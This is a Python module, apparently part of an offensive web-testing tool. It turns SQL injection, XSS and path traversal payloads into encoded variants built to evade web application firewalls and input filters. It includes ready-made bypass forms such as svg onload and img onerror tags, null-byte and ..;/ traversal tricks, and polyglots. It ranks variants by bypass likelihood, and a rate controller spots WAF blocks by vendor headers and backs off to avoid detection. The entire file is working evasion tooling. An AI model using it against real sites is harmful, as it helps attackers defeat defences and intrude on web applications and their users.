"""
Payload Obfuscation & WAF Bypass Engine
=========================================
Generates encoding-chain variants of attack payloads to bypass WAFs,
input validation, and security filters.

Three evasion levels:
  Level 1: URL encoding, case alternation
  Level 2: Double encoding, Unicode bypass, comment insertion, null bytes
  Level 3: Polyglots, HTTP parameter pollution, charset tricks
"""

import random
import re
import urllib.parse


# ================================================================
# ENCODING FUNCTIONS
# ================================================================

def _url_encode(payload: str) -> str:
    """Standard URL encoding."""
    return urllib.parse.quote(payload, safe="")


def _double_url_encode(payload: str) -> str:
    """Double URL encoding — bypasses filters that decode once."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def _unicode_encode(payload: str) -> str:
    """Unicode escape encoding."""
    return "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in payload)


def _html_entity_encode(payload: str) -> str:
    """HTML entity encoding."""
    return "".join(f"&#{ord(c)};" if not c.isalnum() else c for c in payload)


def _hex_entity_encode(payload: str) -> str:
    """HTML hex entity encoding."""
    return "".join(f"&#x{ord(c):x};" if not c.isalnum() else c for c in payload)


def _case_alternate(payload: str) -> str:
    """Randomly alternate case — bypasses case-sensitive filters."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


def _null_byte_inject(payload: str) -> str:
    """Insert null bytes — bypasses strlen-based filters."""
    return payload.replace("<", "%00<").replace("'", "%00'")


def _comment_insert_sql(payload: str) -> str:
    """Insert SQL comments between keywords — bypasses keyword detection."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "INSERT", "UPDATE", "DELETE", "DROP"]
    result = payload
    for kw in keywords:
        result = re.sub(rf'\b({kw})\b', r'/**/\1/**/', result, flags=re.IGNORECASE)
    return result


def _comment_insert_xss(payload: str) -> str:
    """Insert HTML comments in XSS payloads."""
    return payload.replace("<", "<<!---->").replace(">", "<!---->>"[::-1][:3])


def _tab_newline_inject(payload: str) -> str:
    """Replace spaces with tabs/newlines — bypasses space-based detection."""
    return payload.replace(" ", "%09").replace("=", "%09=%09")


def _concat_bypass_sql(payload: str) -> str:
    """Use string concatenation to bypass keyword filters."""
    # 'admin' -> 'adm'||'in'  (SQLite)
    return payload.replace("admin", "'adm'||'in'").replace("SELECT", "SEL"+"ECT")


# ================================================================
# CONTEXT-SPECIFIC GENERATORS
# ================================================================

def _generate_sqli_variants(payload: str, level: int) -> list:
    """Generate SQLi WAF bypass variants."""
    variants = []

    if level >= 1:
        variants.append({"encoding": "url", "payload": _url_encode(payload), "bypass_likelihood": "medium"})
        variants.append({"encoding": "case_alter", "payload": _case_alternate(payload), "bypass_likelihood": "medium"})

    if level >= 2:
        variants.append({"encoding": "double_url", "payload": _double_url_encode(payload), "bypass_likelihood": "high"})
        variants.append({"encoding": "comment_insert", "payload": _comment_insert_sql(payload), "bypass_likelihood": "high"})
        variants.append({"encoding": "tab_inject", "payload": _tab_newline_inject(payload), "bypass_likelihood": "medium"})
        variants.append({"encoding": "null_byte", "payload": _null_byte_inject(payload), "bypass_likelihood": "medium"})
        variants.append({"encoding": "concat_bypass", "payload": _concat_bypass_sql(payload), "bypass_likelihood": "high"})

    if level >= 3:
        # Polyglot: works as both SQLi and XSS
        variants.append({
            "encoding": "polyglot",
            "payload": f"'-var x=1;{payload}//\\';--\"/*",
            "bypass_likelihood": "high",
        })
        # HTTP Parameter Pollution: send param twice
        variants.append({
            "encoding": "hpp",
            "payload": f"normal&q={_url_encode(payload)}",
            "bypass_likelihood": "high",
        })
        # Charset trick: UTF-8 BOM prefix
        variants.append({
            "encoding": "utf8_bom",
            "payload": f"\xef\xbb\xbf{payload}",
            "bypass_likelihood": "medium",
        })

    return variants


def _generate_xss_variants(payload: str, level: int) -> list:
    """Generate XSS WAF bypass variants."""
    variants = []

    if level >= 1:
        variants.append({"encoding": "url", "payload": _url_encode(payload), "bypass_likelihood": "medium"})
        variants.append({"encoding": "case_alter", "payload": _case_alternate(payload), "bypass_likelihood": "medium"})

    if level >= 2:
        variants.append({"encoding": "double_url", "payload": _double_url_encode(payload), "bypass_likelihood": "high"})
        variants.append({"encoding": "html_entity", "payload": _html_entity_encode(payload), "bypass_likelihood": "high"})
        variants.append({"encoding": "hex_entity", "payload": _hex_entity_encode(payload), "bypass_likelihood": "high"})
        variants.append({"encoding": "unicode", "payload": _unicode_encode(payload), "bypass_likelihood": "medium"})
        variants.append({"encoding": "null_byte", "payload": _null_byte_inject(payload), "bypass_likelihood": "medium"})

        # Alternative tags that bypass <script> filters
        if "<script>" in payload.lower():
            variants.append({
                "encoding": "alt_tag_svg",
                "payload": payload.replace("<script>", "<svg/onload=").replace("</script>", ">"),
                "bypass_likelihood": "high",
            })
            variants.append({
                "encoding": "alt_tag_img",
                "payload": payload.replace("<script>", "<img src=x onerror=").replace("</script>", ">"),
                "bypass_likelihood": "high",
            })
            variants.append({
                "encoding": "alt_tag_details",
                "payload": payload.replace("<script>", "<details open ontoggle=").replace("</script>", ">"),
                "bypass_likelihood": "medium",
            })

    if level >= 3:
        # Event handler with tab injection
        variants.append({
            "encoding": "event_tab",
            "payload": payload.replace(" on", "%09on").replace("=", "%09=%09"),
            "bypass_likelihood": "high",
        })
        # JavaScript protocol variants
        variants.append({
            "encoding": "js_protocol",
            "payload": payload.replace("javascript:", "java\tscript:"),
            "bypass_likelihood": "medium",
        })
        # Data URI XSS
        variants.append({
            "encoding": "data_uri",
            "payload": f'<object data="data:text/html,{_url_encode(payload)}">',
            "bypass_likelihood": "medium",
        })

    return variants


def _generate_path_variants(payload: str, level: int) -> list:
    """Generate path traversal WAF bypass variants."""
    variants = []

    if level >= 1:
        variants.append({"encoding": "url", "payload": _url_encode(payload), "bypass_likelihood": "medium"})

    if level >= 2:
        variants.append({"encoding": "double_url", "payload": _double_url_encode(payload), "bypass_likelihood": "high"})
        # Dot-dot alternatives
        variants.append({"encoding": "dot_segment", "payload": payload.replace("../", "..%2f"), "bypass_likelihood": "high"})
        variants.append({"encoding": "backslash", "payload": payload.replace("../", "..\\"), "bypass_likelihood": "medium"})
        variants.append({"encoding": "utf8_dot", "payload": payload.replace(".", "%c0%2e"), "bypass_likelihood": "medium"})

    if level >= 3:
        # Long path normalization
        variants.append({
            "encoding": "long_path",
            "payload": payload.replace("../", "..;/"),
            "bypass_likelihood": "high",
        })
        variants.append({
            "encoding": "null_extension",
            "payload": payload + "%00.png",
            "bypass_likelihood": "high",
        })

    return variants


# ================================================================
# PUBLIC API
# ================================================================

def obfuscate_payload(payload: str, context: str = "sqli", evasion_level: int = 2) -> dict:
    """
    Generate WAF-bypass variants of an attack payload.

    Args:
        payload: Original attack payload
        context: "sqli" | "xss" | "path" — determines encoding strategy
        evasion_level: 1=basic, 2=adaptive, 3=full

    Returns:
        {"original": str, "variants": [...], "recommended": str, "total": int}
    """
    generators = {
        "sqli": _generate_sqli_variants,
        "xss": _generate_xss_variants,
        "path": _generate_path_variants,
    }

    generator = generators.get(context, _generate_sqli_variants)
    variants = generator(payload, evasion_level)

    # Select recommended variant (highest bypass likelihood)
    high_variants = [v for v in variants if v["bypass_likelihood"] == "high"]
    recommended = high_variants[0]["payload"] if high_variants else variants[0]["payload"] if variants else payload

    return {
        "original": payload,
        "context": context,
        "evasion_level": evasion_level,
        "variants": variants,
        "recommended": recommended,
        "total": len(variants),
    }


# ================================================================
# ADAPTIVE RATE CONTROL
# ================================================================

class AdaptiveRateController:
    """WAF-aware adaptive rate limiting."""

    def __init__(self, base_rpm: int = 60):
        self.base_rpm = base_rpm
        self.current_rpm = base_rpm
        self.waf_detections = 0
        self.backoffs = 0
        self.total_delay = 0.0

    def on_response(self, status: int, body: str = "", headers: dict = None) -> float:
        """Analyze response and return recommended delay in seconds."""
        is_blocked = False

        # WAF detection signals
        if status in (403, 429, 503):
            is_blocked = True
        if headers:
            for h in ("cf-ray", "x-sucuri-id", "x-akamai-transformed"):
                if h in str(headers).lower():
                    is_blocked = True
        if body:
            waf_signals = ["blocked", "access denied", "captcha", "rate limit",
                           "too many requests", "security", "waf", "firewall"]
            if any(s in body.lower() for s in waf_signals):
                is_blocked = True

        if is_blocked:
            self.waf_detections += 1
            self.backoffs += 1
            # Exponential backoff: 2s, 4s, 8s, 16s, max 30s
            delay = min(2 ** self.backoffs, 30) + random.uniform(0, 2)
            self.current_rpm = max(self.current_rpm // 2, 5)
            self.total_delay += delay
            return delay
        else:
            # Gradually recover
            if self.current_rpm < self.base_rpm:
                self.current_rpm = min(self.current_rpm + 5, self.base_rpm)
            self.backoffs = max(self.backoffs - 1, 0)
            return 60.0 / self.current_rpm  # Normal pacing

    def stats(self) -> dict:
        return {
            "waf_detections": self.waf_detections,
            "backoffs": self.backoffs,
            "current_rpm": self.current_rpm,
            "total_delay_seconds": round(self.total_delay, 1),
        }
